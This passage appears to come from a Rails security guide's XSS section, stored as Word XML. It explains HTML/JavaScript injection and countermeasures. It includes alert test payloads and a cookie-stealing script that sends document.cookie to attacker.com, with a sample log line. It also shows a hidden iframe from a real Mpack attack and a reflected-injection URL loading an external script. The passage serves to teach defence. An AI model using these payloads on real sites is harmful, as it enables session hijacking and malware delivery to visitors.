    <w:p w14:paraId="46B861A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable – just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> parameter – obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the </w:t>
      </w:r>
      <w:hyperlink r:id="rId718" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Live </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>HTTP</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Headers Firefox plugin</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>, or client-site proxies make it easy to change requests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A867A8A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> examples simply display an alert box, but it is more powerful than that. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0417CF30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The </w:t>
      </w:r>
      <w:hyperlink r:id="rId719" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Symantec Global Internet Security threat report</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> also documented 239 browser plug-in vulnerabilities in the last six months of 2007. </w:t>
      </w:r>
      <w:hyperlink r:id="rId720" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Mpack</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t>-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="207409C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to </w:t>
      </w:r>
      <w:hyperlink r:id="rId721" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Trend Micro</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA6F620" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.3.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t>/JavaScript Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063CE845" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most common </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> language is of course the most popular client-side scripting language JavaScript, often in combination with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Escaping user input is essential</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A74CD8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here is the most straightforward test to check for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="61F28B52" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="523BF9FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="360740793"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;script&gt;alert('Hello');&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="30D7A0E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5448"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0C48FC16" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B44AF22" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;img</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>src=javascript:alert('Hello')&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74FF96CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;table</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>background="javascript:alert('Hello')"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66FB81BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>8.3.2.1 Cookie Theft</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59AC9D14" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">These examples don’t do any harm so far, so let’s see how an attacker can steal the user’s cookie (and thus hijack the user’s session). In JavaScript you can use the document.cookie property to read and write the document’s cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> document (as it happens with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t>). Inject this anywhere in your web application to see your own cookie on the result page:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4533FA96" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E12E04E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="949511519"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;script&gt;document.write(document.cookie);&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="762115B2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> http://www.attacker.com/ plus the cookie. Of course this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> does not exist, so the browser displays nothing. But the attacker can review his web server’s access log files to see the victim’s cookie.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08392E3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E4A3942" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1020009748"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;script&gt;document.write('&lt;img</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>src="</w:t>
            </w:r>
            <w:hyperlink r:id="rId722" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.attacker.com/</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>' + document.cookie + '"&gt;');&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42A6D652" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The log files on www.attacker.com will read like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7339"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5A91425B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1578E90D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="673147609"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">GET </w:t>
            </w:r>
            <w:hyperlink r:id="rId723" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11AB8476" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can mitigate these attacks (in the obvious way) by adding the </w:t>
      </w:r>
      <w:hyperlink r:id="rId724" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>httpOnly</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies </w:t>
      </w:r>
      <w:hyperlink r:id="rId725" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>will still be visible using Ajax</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>, though.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C056FD1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>8.3.2.2 Defacement</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779F93AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes: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9A4F014" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3FF0F2F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="895093138"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;iframe</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>name=”StatPage” src="</w:t>
            </w:r>
            <w:hyperlink r:id="rId726" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://58.xx.xxx.xxx</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>width=5</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>height=5</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>style=”display:none”&gt;&lt;/iframe&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="679AF1A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This loads arbitrary </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the </w:t>
      </w:r>
      <w:hyperlink r:id="rId727" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Mpack attack framework</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E356AF6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site’s original, but transmits the user name and password to the attacker’s site. Or it could use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22552A4C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t>. Especially search forms fail to escape the search string. The following link presented a page which stated that “George Bush appointed a 9 year old boy to be the chairperson…”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8166"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="28E56949" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="384471AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
            <w:hyperlink r:id="rId728" w:history="1">
              <w:r w:rsidR="009A002D">
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="009A002D">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34C9483F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;script src=</w:t>
            </w:r>
            <w:hyperlink r:id="rId729" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;!--</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0404EB8B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>8.3.2.3 Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCCD4B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>It is very important to filter malicious input, but it is also important to escape the output of the web application</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C084FB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Especially for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, it is important to do </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>whitelist input filtering instead of blacklist</w:t>
      </w:r>
      <w:r>
        <w:t>. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E5CE0F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Imagine a blacklist deletes “script” from the user input. Now the attacker injects “&lt;scrscriptipt&gt;”, and after the filter, “&lt;script&gt;” remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="55DDC8F2" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C1ED4FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="906569187"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
